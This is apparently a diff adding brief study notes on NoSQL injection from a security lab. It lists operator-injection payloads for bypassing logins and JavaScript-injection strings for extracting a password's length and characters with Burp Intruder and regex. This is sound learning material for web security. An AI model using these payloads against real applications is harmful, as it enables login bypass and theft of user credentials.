@@ -1,0 +1,21 @@
+Mostly same as SQL injection. Just different in terms of syntax.
+
+If the data is in the form of JSON:
+{"username":{"$ne":"invalid"}}
+
+For URL-based input:
+username[$ne]=invalid
+
+
+Extracting data from NoSQL data lab: (getting the password)
+
+Get the length of the password: user=administrator'%26%26this.password.length==§1§%00
+Get the password using Burp Intruder, JS .match() and Regex: user=administrator'%26%26this.password.match("^.{§0§}§a§.*$")%00
+
+
+Extract the object field name (noSQL has field names no strict tables):
+Use burp Intruder and Operator injection to Extract field character by character: reger --> ^.{0}a.* --> 0 from 0 to length and a from a to z
+
+
+Basically as soon as you find JSON in the body or the URL is vulnerable, try for the NoSQL attack.
+Can be done using normal JSON methods like $where, $ne, $regex, etc.
